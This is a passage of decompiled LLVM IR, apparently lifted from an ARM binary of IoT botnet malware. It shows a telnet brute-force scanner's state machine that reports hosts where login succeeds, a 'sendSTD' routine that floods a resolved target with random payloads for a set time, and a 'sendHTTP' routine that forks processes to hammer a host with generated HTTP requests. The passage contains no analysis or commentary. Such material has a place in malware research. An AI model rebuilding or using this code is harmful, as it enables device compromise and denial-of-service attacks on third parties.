  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  br i1 %v1_bea0, label %dec_label_pc_bea8, label %dec_label_pc_becc

dec_label_pc_bea8:                                ; preds = %dec_label_pc_be00
  %v3_bec4 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_becc:                                ; preds = %dec_label_pc_be00
  %v2_bee4 = load i32, i32* %v1_be18, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_bef8 = call i32 @__libc_send(i32 %v2_bee4, i32* bitcast ([3 x i8]* @global_var_193f4.371 to i32*), i32 2, i32 16384)
  %v1_bf00 = icmp slt i32 %v6_bef8, 0
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  br i1 %v1_bf00, label %dec_label_pc_bf08, label %dec_label_pc_bf2c

dec_label_pc_bf08:                                ; preds = %dec_label_pc_becc
  %v3_bf24 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_bf2c:                                ; preds = %dec_label_pc_becc
  %v3_bf4c = call i32 @advance_state(i32* nonnull %v1_be18, i32 6)
  br label %dec_label_pc_c3c8

dec_label_pc_bf54:                                ; preds = %dec_label_pc_b358
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_bf6c = inttoptr i32 %v2_b30c to i32*
  %v2_bf6c = load i32, i32* %v1_bf6c, align 4
  store i32 %v2_bf6c, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_bf8c = add i32 %v2_b308, %v2_ba48
  store i32 %v2_bf8c, i32* %r3.global-to-local, align 4
  %v1_bf90 = inttoptr i32 %v2_bf8c to i32*
  %v2_bf90 = load i32, i32* %v1_bf90, align 4
  store i32 %v2_bf90, i32* %r2.global-to-local, align 4
  %v1_bf98 = load i32, i32* @sp, align 4
  %v2_bf98 = inttoptr i32 %v1_bf98 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_23dbc.375 to i32), i32* %v2_bf98, align 4
  %v0_bf9c = load i32, i32* %ip.global-to-local, align 4
  store i32 1024, i32* %r3.global-to-local, align 4
  %v4_bfa8 = inttoptr i32 %v2_bf90 to i8*
  %v5_bfa8 = call i32 @read_until_response(i32 %v0_bf9c, i32 %arg1, i8* %v4_bfa8, i32 1024)
  store i32 %v5_bfa8, i32* %r3.global-to-local, align 4
  %v2_bfb0 = icmp eq i32 %v5_bfa8, 0
  br i1 %v2_bfb0, label %dec_label_pc_c1cc, label %dec_label_pc_bfb8

dec_label_pc_bfb8:                                ; preds = %dec_label_pc_bf54
  store i32 %storemerge553, i32* @r4, align 4
  %v2_bfc0 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_bfd4 = load i32, i32* @r4, align 4
  %v2_bfe0 = mul i32 %v0_bfd4, 28
  %v2_bfe8 = add i32 %v2_b9cc, %v2_bfe0
  %v2_bfec = inttoptr i32 %v2_bfe8 to i32*
  store i32 %v2_bfc0, i32* %v2_bfec, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_bf8c, i32* %r3.global-to-local, align 4
  %v2_c010 = load i32, i32* %v1_bf90, align 4
  store i32 %v2_c010, i32* %r3.global-to-local, align 4
  %v1_c018 = call i32 @contains_fail(i32 %v2_c010)
  store i32 %v1_c018, i32* %r3.global-to-local, align 4
  %v2_c020 = icmp eq i32 %v1_c018, 0
  br i1 %v2_c020, label %dec_label_pc_c050, label %dec_label_pc_c028

dec_label_pc_c028:                                ; preds = %dec_label_pc_bfb8
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c048 = call i32 @advance_state(i32* %v1_bf6c, i32 0)
  br label %dec_label_pc_c3c8

dec_label_pc_c050:                                ; preds = %dec_label_pc_bfb8
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_bf8c, i32* %r3.global-to-local, align 4
  %v2_c070 = load i32, i32* %v1_bf90, align 4
  store i32 %v2_c070, i32* %r3.global-to-local, align 4
  %v1_c078 = call i32 @contains_success(i32 %v2_c070)
  store i32 %v1_c078, i32* %r3.global-to-local, align 4
  %v2_c080 = icmp eq i32 %v1_c078, 0
  br i1 %v2_c080, label %dec_label_pc_c1a8, label %dec_label_pc_c088

dec_label_pc_c088:                                ; preds = %dec_label_pc_c050
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_c0a4 = add i32 %v2_b30c, 8
  store i32 %v2_c0a4, i32* %r3.global-to-local, align 4
  %v1_c0a8 = add i32 %v2_b30c, 9
  %v2_c0a8 = inttoptr i32 %v1_c0a8 to i8*
  %v3_c0a8 = load i8, i8* %v2_c0a8, align 1
  %v4_c0a8 = zext i8 %v3_c0a8 to i32
  store i32 %v4_c0a8, i32* %r3.global-to-local, align 4
  %v7_c0ac = icmp eq i8 %v3_c0a8, 2
  br i1 %v7_c0ac, label %dec_label_pc_c0b4, label %dec_label_pc_c0dc

dec_label_pc_c0b4:                                ; preds = %dec_label_pc_c088
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c0d4 = call i32 @advance_state(i32* %v1_bf6c, i32 7)
  br label %dec_label_pc_c3c8

dec_label_pc_c0dc:                                ; preds = %dec_label_pc_c088
  %v2_c0e0 = load i32, i32* @global_var_24170.48, align 4
  store i32 %v2_c0e0, i32* @r4, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c100 = call i32 @get_telstate_host(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  store i32 %v3_c100, i32* %ip.global-to-local, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_c0a4, i32* %r3.global-to-local, align 4
  %v1_c128 = add i32 %v2_b30c, 10
  %v2_c128 = inttoptr i32 %v1_c128 to i8*
  %v3_c128 = load i8, i8* %v2_c128, align 2
  %v4_c128 = zext i8 %v3_c128 to i32
  store i32 %v4_c128, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([769 x i8*]* @global_var_23144.369 to i32), i32* %r3.global-to-local, align 4
  %v4_c134 = mul nuw nsw i32 %v4_c128, 4
  %v5_c134 = add i32 %v4_c134, ptrtoint ([769 x i8*]* @global_var_23144.369 to i32)
  %v6_c134 = inttoptr i32 %v5_c134 to i32*
  %v7_c134 = load i32, i32* %v6_c134, align 4
  store i32 %v7_c134, i32* @lr, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_c0a4, i32* %r3.global-to-local, align 4
  %v1_c158 = add i32 %v2_b30c, 11
  %v2_c158 = inttoptr i32 %v1_c158 to i8*
  %v3_c158 = load i8, i8* %v2_c158, align 1
  %v4_c158 = zext i8 %v3_c158 to i32
  store i32 %v4_c158, i32* %r2.global-to-local, align 4
  store i32 ptrtoint ([334 x i8*]* @global_var_23810.373 to i32), i32* %r3.global-to-local, align 4
  %v4_c164 = mul nuw nsw i32 %v4_c158, 4
  %v5_c164 = add i32 %v4_c164, ptrtoint ([334 x i8*]* @global_var_23810.373 to i32)
  %v6_c164 = inttoptr i32 %v5_c164 to i32*
  %v7_c164 = load i32, i32* %v6_c164, align 4
  %v1_c168 = load i32, i32* @sp, align 4
  %v2_c168 = inttoptr i32 %v1_c168 to i32*
  store i32 %v7_c164, i32* %v2_c168, align 4
  %v0_c16c = load i32, i32* @r4, align 4
  %v0_c174 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_c174, i32* @r2, align 4
  %v0_c178 = load i32, i32* @lr, align 4
  store i32 %v0_c178, i32* %r3.global-to-local, align 4
  %v2_c17c = call i32 @Rootsprintf(i32 %v0_c16c, i32 ptrtoint (i32* @global_var_193f8.378 to i32))
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c1a0 = call i32 @advance_state(i32* %v1_bf6c, i32 7)
  br label %dec_label_pc_c3c8

dec_label_pc_c1a8:                                ; preds = %dec_label_pc_c050
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c1c4 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_c1cc:                                ; preds = %dec_label_pc_bf54
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_c1e8 = add i32 %v2_b308, %v2_b9cc
  store i32 %v2_c1e8, i32* %r3.global-to-local, align 4
  %v1_c1ec = inttoptr i32 %v2_c1e8 to i32*
  %v2_c1ec = load i32, i32* %v1_c1ec, align 4
  store i32 %v2_c1ec, i32* %r3.global-to-local, align 4
  %v1_c1f0 = add i32 %v2_c1ec, 7
  store i32 %v1_c1f0, i32* @r4, align 4
  %v2_c1f8 = call i32 @__GI_time(i32* null)
  store i32 %v2_c1f8, i32* %r3.global-to-local, align 4
  %v0_c200 = load i32, i32* @r4, align 4
  %v3_c200 = icmp ult i32 %v0_c200, %v2_c1f8
  br i1 %v3_c200, label %dec_label_pc_c208, label %dec_label_pc_c3c8

dec_label_pc_c208:                                ; preds = %dec_label_pc_c1cc
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c224 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_c258:                                ; preds = %dec_label_pc_b358
  store i32 %storemerge553, i32* @r4, align 4
  %v2_c260 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_c274 = load i32, i32* @r4, align 4
  %v2_c280 = mul i32 %v0_c274, 28
  %v2_c288 = add i32 %v2_b9cc, %v2_c280
  %v2_c28c = inttoptr i32 %v2_c288 to i32*
  store i32 %v2_c260, i32* %v2_c28c, align 4
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v1_c2a8 = inttoptr i32 %v2_b30c to i32*
  %v2_c2a8 = load i32, i32* %v1_c2a8, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_c2bc = call i32 @__libc_send(i32 %v2_c2a8, i32* bitcast ([5 x i8]* @global_var_19458.380 to i32*), i32 4, i32 16384)
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_c2d8 = load i32, i32* %v1_c2a8, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v6_c2ec = call i32 @__libc_send(i32 %v2_c2d8, i32* bitcast ([8 x i8]* @global_var_19460.382 to i32*), i32 7, i32 16384)
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v2_c308 = load i32, i32* %v1_c2a8, align 4
  store i32 %v2_c308, i32* @r4, align 4
  %v2_c310 = load i32, i32* bitcast ([443 x i8]** @global_var_23140.385 to i32*), align 4
  store i32 %v2_c310, i32* @r5, align 4
  store i32 %v2_c310, i32* %r3.global-to-local, align 4
  %v1_c31c = inttoptr i32 %v2_c310 to i8*
  %v3_c320 = call i32 @strlen(i8* %v1_c31c)
  %v0_c328 = load i32, i32* @r4, align 4
  %v0_c32c = load i32, i32* @r5, align 4
  store i32 %v3_c320, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %tmp44 = inttoptr i32 %v0_c32c to i32*
  %v6_c338 = call i32 @__libc_send(i32 %v0_c328, i32* %tmp44, i32 %v3_c320, i32 16384)
  store i32 %v6_c338, i32* %r3.global-to-local, align 4
  %v1_c340 = icmp slt i32 %v6_c338, 0
  br i1 %v1_c340, label %dec_label_pc_c348, label %dec_label_pc_c36c

dec_label_pc_c348:                                ; preds = %dec_label_pc_c258
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c364 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_c36c:                                ; preds = %dec_label_pc_c258
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  %v2_c388 = add i32 %v2_b308, %v2_b9cc
  store i32 %v2_c388, i32* %r3.global-to-local, align 4
  %v1_c38c = inttoptr i32 %v2_c388 to i32*
  %v2_c38c = load i32, i32* %v1_c38c, align 4
  store i32 %v2_c38c, i32* %r3.global-to-local, align 4
  %v1_c390 = add i32 %v2_c38c, 25
  store i32 %v1_c390, i32* @r4, align 4
  %v2_c398 = call i32 @__GI_time(i32* null)
  store i32 %v2_c398, i32* %r3.global-to-local, align 4
  %v0_c3a0 = load i32, i32* @r4, align 4
  %v3_c3a0 = icmp ult i32 %v0_c3a0, %v2_c398
  br i1 %v3_c3a0, label %dec_label_pc_c3a8, label %dec_label_pc_c3c8

dec_label_pc_c3a8:                                ; preds = %dec_label_pc_c36c
  store i32 %v3_b300, i32* %r2.global-to-local, align 4
  store i32 %v2_b30c, i32* %r3.global-to-local, align 4
  %v3_c3c4 = call i32 @reset_telstate(i32 %v2_b30c, i32 %v3_b1a4, i32 %v3_b300)
  br label %dec_label_pc_c3c8

dec_label_pc_c3c8:                                ; preds = %dec_label_pc_b9b4, %dec_label_pc_bb00, %dec_label_pc_bda0, %dec_label_pc_c1cc, %dec_label_pc_c36c, %dec_label_pc_b358, %dec_label_pc_b59c, %dec_label_pc_c348, %dec_label_pc_c208, %dec_label_pc_c1a8, %dec_label_pc_c0dc, %dec_label_pc_c0b4, %dec_label_pc_c028, %dec_label_pc_bf2c, %dec_label_pc_bf08, %dec_label_pc_bea8, %dec_label_pc_bddc, %dec_label_pc_bd78, %dec_label_pc_bd50, %dec_label_pc_bc8c, %dec_label_pc_bc68, %dec_label_pc_bc08, %dec_label_pc_bb3c, %dec_label_pc_bad8, %dec_label_pc_bab0, %dec_label_pc_b9f0, %dec_label_pc_b990, %dec_label_pc_b8fc, %dec_label_pc_b8d8, %dec_label_pc_b72c, %dec_label_pc_b708, %dec_label_pc_c3a8
  %v1_c3cc = add nuw nsw i32 %storemerge553, 1
  store i32 %v1_c3cc, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  %v5_c3e0 = icmp slt i32 %v1_c3cc, %arg2
  br i1 %v5_c3e0, label %dec_label_pc_b2f4, label %dec_label_pc_b2e8

; uselistorder directives
  uselistorder i32 %v1_c3cc, { 2, 1, 0 }
  uselistorder i32 %v3_c320, { 1, 0 }
  uselistorder i32* %v1_bf6c, { 1, 0, 2, 3 }
  uselistorder i32 %v3_be80, { 1, 0 }
  uselistorder i32 %v3_bbe0, { 1, 0 }
  uselistorder i32 %v5_b868, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v1_b56c, { 1, 0 }
  uselistorder i32 %v0_b4a0, { 1, 0 }
  uselistorder i32 %v2_b3f4, { 0, 3, 2, 1 }
  uselistorder i32 %v2_b3f0, { 1, 0, 2, 3 }
  uselistorder i8 %v2_b378, { 1, 0 }
  uselistorder i32 %v0_b33c, { 1, 0 }
  uselistorder i32* %v1_b314, { 1, 0, 2 }
  uselistorder i32 %v2_b310, { 1, 0, 2, 3 }
  uselistorder i32 %v2_b30c, { 76, 75, 74, 73, 77, 78, 80, 79, 59, 58, 61, 60, 63, 64, 65, 67, 66, 62, 69, 68, 70, 72, 71, 53, 52, 51, 50, 55, 54, 57, 56, 46, 45, 47, 4, 49, 48, 40, 39, 38, 37, 42, 41, 44, 43, 33, 32, 34, 3, 36, 35, 27, 26, 25, 24, 18, 19, 20, 22, 21, 23, 28, 29, 31, 30, 6, 8, 7, 9, 10, 11, 13, 12, 1, 2, 15, 14, 0, 17, 16, 5 }
  uselistorder i32 %v2_b308, { 0, 1, 2, 3, 4, 5, 7, 8, 6 }
  uselistorder i32 %v3_b300, { 79, 80, 78, 76, 77, 75, 74, 73, 59, 60, 58, 63, 64, 71, 70, 69, 67, 68, 66, 65, 62, 72, 61, 57, 56, 54, 55, 52, 53, 51, 50, 49, 45, 46, 44, 48, 47, 43, 42, 40, 41, 38, 39, 37, 36, 35, 31, 32, 30, 34, 33, 29, 28, 26, 27, 25, 23, 24, 21, 20, 22, 19, 18, 17, 16, 15, 11, 9, 10, 8, 7, 6, 5, 4, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge553, { 1, 4, 5, 6, 7, 10, 9, 8, 3, 2, 0 }
  uselistorder i32 %v2_b9cc, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_b754, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v2_b5f4, { 1, 0 }
  uselistorder i32 %v1_b2cc, { 1, 2, 0 }
  uselistorder i32 %v1_b2a8, { 2, 1, 0 }
  uselistorder i32 %storemerge462, { 1, 0 }
  uselistorder i32 %v2_b1c8, { 1, 0 }
  uselistorder i32 %v3_b1a4, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 146, 0, 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 34, 35, 38, 36, 37, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 53, 50, 51, 54, 55, 56, 52, 59, 57, 58, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 74, 71, 72, 75, 76, 77, 73, 80, 78, 79, 81, 84, 82, 83, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 170, 103, 104, 105, 106, 109, 107, 108, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 171, 147, 148, 149, 162, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 172, 163, 164, 165, 167, 166, 169, 168 }
  uselistorder i32* %r2.global-to-local, { 96, 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 102, 97, 98, 101, 99, 100 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 ptrtoint ([334 x i8*]* @global_var_23810.373 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32* bitcast ([3 x i8]* @global_var_193f4.371 to i32*), { 1, 0 }
  uselistorder i32 ptrtoint ([769 x i8*]* @global_var_23144.369 to i32), { 2, 3, 0, 4, 1, 5 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 5, 4, 2, 7, 6, 0, 1, 3, 8, 9 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_c3c8, { 31, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 5 }
  uselistorder label %dec_label_pc_b768, { 1, 0 }
  uselistorder label %dec_label_pc_b72c, { 1, 0 }
  uselistorder label %dec_label_pc_b59c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b358, { 1, 0 }
  uselistorder label %dec_label_pc_b2f4, { 1, 0 }
  uselistorder label %dec_label_pc_b2e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1ec, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_c3ec = load i32, i32* @fp, align 4
  store i32 %v3_c3ec, i32* %stack_var_-16, align 4
  store i32 50164, i32* %stack_var_-4, align 4
  %v13_c3ec = ptrtoint i32* %stack_var_-16 to i32
  %v2_c3f0 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c3f0, i32* @fp, align 4
  store i32 %arg3, i32* %stack_var_-208, align 4
  %v0_c410 = call i32 @socket()
  %v2_c420 = call i32 @__GI_time(i32* null)
  %v1_c434 = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 16, i32* @r2, align 4
  %v2_c450 = bitcast i32* %stack_var_-52 to i8*
  %v3_c450 = call i32 @__GI_memset(i8* %v2_c450, i32 0)
  %v1_c458 = add i32 %v1_c434, 16
  %v2_c458 = inttoptr i32 %v1_c458 to i32*
  %v3_c458 = load i32, i32* %v2_c458, align 4
  %v1_c45c = inttoptr i32 %v3_c458 to i32*
  %v2_c45c = load i32, i32* %v1_c45c, align 4
  %v2_c464 = ptrtoint i32* %stack_var_-48 to i32
  %v1_c46c = add i32 %v1_c434, 12
  %v2_c46c = inttoptr i32 %v1_c46c to i32*
  %v3_c46c = load i32, i32* %v2_c46c, align 4
  store i32 %v3_c46c, i32* @r2, align 4
  %v3_c47c = call i32 @bcopy(i32 %v2_c45c, i32 %v2_c464, i32 %v3_c46c)
  %v1_c484 = add i32 %v1_c434, 8
  %v2_c484 = inttoptr i32 %v1_c484 to i32*
  %v3_c484 = load i32, i32* %v2_c484, align 4
  %v3_c48c = urem i32 %v3_c484, 65536
  store i32 %v3_c48c, i32* %stack_var_-52, align 4
  %v2_c4c0 = ptrtoint i32* %stack_var_-196 to i32
  %v3_c53c = bitcast i32* %stack_var_-52 to %sockaddr*
  %v2_c4fc = add i32 %v13_c3ec, -180
  br label %dec_label_pc_c4bc

dec_label_pc_c4bc:                                ; preds = %dec_label_pc_c578, %entry
  %storemerge3 = phi i32 [ 0, %entry ], [ %v1_c57c, %dec_label_pc_c578 ]
  store i32 %v2_c4c0, i32* @r0, align 4
  store i32 ptrtoint ([36 x i8*]* @global_var_1960c.423 to i32), i32* @r1, align 4
  store i32 144, i32* @r2, align 4
  %v0_c4d4 = call i32 @memcpy()
  %v0_c4d8 = call i32 @random()
  %tmp = icmp ult i32 %storemerge3, 50
  br i1 %tmp, label %dec_label_pc_c578, label %dec_label_pc_c518

dec_label_pc_c518:                                ; preds = %dec_label_pc_c4bc
  %v2_c4e8 = urem i32 %v0_c4d8, 36
  %v3_c4f4 = mul nuw nsw i32 %v2_c4e8, 4
  %v2_c500 = add i32 %v2_c4fc, %v3_c4f4
  %v1_c504 = inttoptr i32 %v2_c500 to i32*
  %v2_c504 = load i32, i32* %v1_c504, align 4
  %v5_c528 = inttoptr i32 %v2_c504 to i32*
  %v6_c528 = call i32 @__libc_send(i32 %v0_c410, i32* %v5_c528, i32 65, i32 0)
  %v4_c53c = call i32 @__libc_connect(i32 %v0_c410, %sockaddr* %v3_c53c, i32 16)
  %v2_c544 = call i32 @__GI_time(i32* null)
  %v3_c550 = load i32, i32* %stack_var_-208, align 4
  %v2_c554 = add i32 %v3_c550, %v2_c420
  %v5_c55c = icmp slt i32 %v2_c544, %v2_c554
  br i1 %v5_c55c, label %dec_label_pc_c570, label %dec_label_pc_c560

dec_label_pc_c560:                                ; preds = %dec_label_pc_c518
  %v1_c564 = call i32 @__libc_close(i32 %v0_c410)
  %v1_c56c = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_c570:                                ; preds = %dec_label_pc_c518
  br label %dec_label_pc_c578

dec_label_pc_c578:                                ; preds = %dec_label_pc_c4bc, %dec_label_pc_c570
  %stack_var_-24.0 = phi i32 [ %storemerge3, %dec_label_pc_c4bc ], [ 0, %dec_label_pc_c570 ]
  %v1_c57c = add i32 %stack_var_-24.0, 1
  br label %dec_label_pc_c4bc

; uselistorder directives
  uselistorder i32 %storemerge3, { 1, 0 }
  uselistorder i32 %v3_c46c, { 1, 0 }
  uselistorder i32 %v1_c434, { 2, 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 2, 1 }
  uselistorder i32 65, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_c578, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i8 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = sext i8 %arg3 to i32
  %stack_var_-545 = alloca i32, align 4
  %stack_var_-544 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v1_c58c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_c58c, i32* @ip, align 4
  %v3_c590 = load i32, i32* @fp, align 4
  store i32 50584, i32* %stack_var_-4, align 4
  %v2_c594 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_c594, i32* @fp, align 4
  %v2_c5b8 = call i32 @__GI_time(i32* null)
  %v3_c5c0 = load i32, i32* %stack_var_0, align 4
  %v2_c5c4 = add i32 %v3_c5c0, %v2_c5b8
  %v2_c604 = ptrtoint i32* %stack_var_-544 to i32
  %tmp24 = bitcast i32* %stack_var_-544 to i8*
  %v2_c690 = ptrtoint i32* %stack_var_-545 to i32
  %v5_c6e431 = icmp sgt i32 %arg6, 0
  br i1 %v5_c6e431, label %dec_label_pc_c5e0, label %dec_label_pc_c6e8

dec_label_pc_c5e0:                                ; preds = %entry, %dec_label_pc_c6cc
  %storemerge232 = phi i32 [ %v1_c6d0, %dec_label_pc_c6cc ], [ 0, %entry ]
  %v0_c5e0 = call i32 @random()
  %v2_c5f0 = srem i32 %v0_c5e0, 36
  %v4_c600 = mul nsw i32 %v2_c5f0, 4
  %v5_c600 = add i32 %v4_c600, ptrtoint ([37 x i8*]* @global_var_230ac.462 to i32)
  %v6_c600 = inttoptr i32 %v5_c600 to i32*
  %v7_c600 = load i32, i32* %v6_c600, align 4
  store i32 %v2_c604, i32* @r0, align 4
  %v7_c624 = call i32 @sprintf(i32 %v2_c604, i32 ptrtoint ([64 x i8]* @global_var_1969c.464 to i32), i32 %arg1, i32 %arg4, i32 %arg2, i32 %v7_c600)
  %v0_c628 = call i32 @__libc_fork()
  %v2_c630 = icmp eq i32 %v0_c628, 0
  br i1 %v2_c630, label %dec_label_pc_c6cc, label %dec_label_pc_c6ac

dec_label_pc_c63c:                                ; preds = %dec_label_pc_c6ac
  %v5_c654 = call i32 @socket_connect(i32 %arg2, i8 %arg3, i32 %tmp)
  %v2_c664 = icmp eq i32 %v5_c654, 0
  br i1 %v2_c664, label %dec_label_pc_c6ac, label %dec_label_pc_c66c

dec_label_pc_c66c:                                ; preds = %dec_label_pc_c63c
  %v3_c674 = call i32 @strlen(i8* %tmp24)
  store i32 %v3_c674, i32* @r2, align 4
  %v3_c688 = call i32 @__libc_write(i32 %v5_c654, i32* nonnull %stack_var_-544)
  store i32 %v2_c690, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_c6a0 = call i32 @__libc_read(i32 %v5_c654)
  %v1_c6a8 = call i32 @__libc_close(i32 %v5_c654)
  br label %dec_label_pc_c6ac

dec_label_pc_c6ac:                                ; preds = %dec_label_pc_c63c, %dec_label_pc_c66c, %dec_label_pc_c5e0
  %v2_c6b0 = call i32 @__GI_time(i32* null)
  %v5_c6c0 = icmp slt i32 %v2_c6b0, %v2_c5c4
  br i1 %v5_c6c0, label %dec_label_pc_c63c, label %dec_label_pc_c6c4

dec_label_pc_c6c4:                                ; preds = %dec_label_pc_c6ac
  %v1_c6c8 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_c6cc

dec_label_pc_c6cc:                                ; preds = %dec_label_pc_c5e0, %dec_label_pc_c6c4
  %v9_c6ec4 = phi i32 [ 0, %dec_label_pc_c5e0 ], [ %v1_c6c8, %dec_label_pc_c6c4 ]
  %v1_c6d0 = add nuw nsw i32 %storemerge232, 1
